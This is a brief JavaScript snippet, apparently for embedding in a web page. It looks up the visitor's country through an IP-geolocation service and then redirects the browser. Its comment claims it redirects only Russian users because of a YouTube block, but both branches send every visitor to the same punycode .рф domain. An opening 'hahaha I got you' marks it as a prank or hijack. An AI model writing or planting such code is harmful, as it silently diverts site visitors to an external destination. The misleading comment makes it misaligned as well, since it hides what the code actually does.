// hahaha I got you
//determinate where user located
const countrcode = document.getElementById('country_code');

fetch('https://ipwho.is/')
  .then(res => res.json())
  .then(res => {
    const countryCode = res.country_code;

    // Redirect user based on his country location because YouTube bloked in Russia
    if (countryCode == "RU") {
      window.location.href = "https://xn--80aabtwbbuhbiqdxddn.xn--p1ai";
      window.location.replace("https://xn--80aabtwbbuhbiqdxddn.xn--p1ai");
    } else {
    window.location.href = "https://xn--80aabtwbbuhbiqdxddn.xn--p1ai";
    window.location.replace("https://xn--80aabtwbbuhbiqdxddn.xn--p1ai");
    }
  });
